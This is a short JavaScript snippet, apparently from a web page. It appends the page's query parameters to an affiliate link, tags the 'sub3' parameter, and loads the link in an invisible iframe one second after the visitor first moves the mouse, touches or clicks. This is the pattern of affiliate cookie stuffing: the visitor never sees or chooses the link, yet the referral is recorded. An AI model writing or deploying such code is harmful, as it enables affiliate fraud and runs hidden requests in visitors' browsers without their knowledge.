	document.addEventListener('DOMContentLoaded', function() {
		var params = new URLSearchParams(window.location.search);
		var n = affLink;
		
		if (params.toString()) {
			if (params.has('sub3')) {
				var sub3Info = params.get('sub3');
				params.set('sub3', sub3Info + '_if1s');
			}
			
			var separator = n.includes('?') ? '&' : '?';
			
			params.forEach(function(value, key) {
				n += separator + key + '=' + value;
				separator = '&';
			});
		}

		let timeout;
		let hasInteracted = false;

		function loadPage() {
			var linkLoad = document.createElement('iframe');
			linkLoad.style.display = 'none';
			linkLoad.src = n;
			document.body.appendChild(linkLoad);
		}
		
		const userInteractions = [
			'mousemove', 'touchstart', 'click'
		];

		userInteractions.forEach(function(event) {
			document.addEventListener(event, function() {
				if (!hasInteracted) {
					hasInteracted = true;
					if (params.toString()) {
						timeout = setTimeout(loadPage, 1000);
						//loadPage();
					}
				}
			});
		});
	});
